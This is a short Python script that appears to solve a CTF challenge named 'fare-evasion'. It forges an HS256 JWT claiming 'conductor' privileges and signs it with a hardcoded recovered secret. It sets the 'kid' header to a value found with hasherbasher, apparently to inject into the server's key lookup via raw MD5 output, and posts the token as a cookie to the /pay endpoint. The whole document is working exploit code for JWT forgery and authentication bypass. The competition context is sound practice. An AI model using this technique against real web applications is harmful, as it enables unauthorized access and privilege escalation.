#!/usr/bin/python3
import requests
import jwt
import hashlib

url = f'https://fare-evasion.chal.uiuc.tf'

def pay(s, encoded_jwt):
    req = s.post(url + '/pay', cookies = {'access_token': encoded_jwt})
    return req.text

if __name__ == '__main__':
    s = requests.Session()
    passenger_secret = "a_boring_passenger_signing_key_?"
    hashed = 'DyrhGOYP0vxI2DtH8y' # https://github.com/gen0cide/hasherbasher
    conductor_secret = 'conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e'
    
    secret = conductor_secret
    encoded_jwt = jwt.encode({'type': 'conductor'}, secret, algorithm="HS256", headers={'kid': hashed})

    print(pay(s, encoded_jwt))
